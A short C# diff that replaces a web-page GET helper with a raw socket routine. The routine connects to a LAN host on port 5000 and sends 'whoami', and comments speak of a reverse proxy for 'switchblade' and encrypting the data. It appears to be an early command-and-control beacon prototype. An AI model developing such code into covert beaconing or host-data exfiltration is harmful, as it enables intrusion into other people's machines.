@@ -22,20 +22,23 @@ namespace Testing
 
             Console.WriteLine(whoami);
 
-            GetWebPage("192.168.1.50","/index1.html");
+            Socks("192.168.1.50", whoami);
+
         }
-        public static string GetWebPage(string host, string page)
+        public static string Socks(string host, string whoami)
         // This works!!!
         // This allows us to send a GET to a webpage through a socket
         // We need to now put a reverse proxy infront of switchblade so that we can route non-https traffic to https
         // But over http, this works fine. But doesn't work with sslcontext=adhoc
+        // we need to transition away from webpages and use encryped sockets to manage this
+        // ooooorrrrrrrrrrr we'll just public key encrypt the data
         {
             // Setup the socket
             Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
             s.Connect(host, 5000);
 
             // Construct the request string
-            string request = "GET " + page + " HTTP/1.1\r\nHost: " + host + "\r\n\r\n";
+            string request = "whoami";
             byte[] requestBytes = Encoding.ASCII.GetBytes(request);
 
             // Send the request
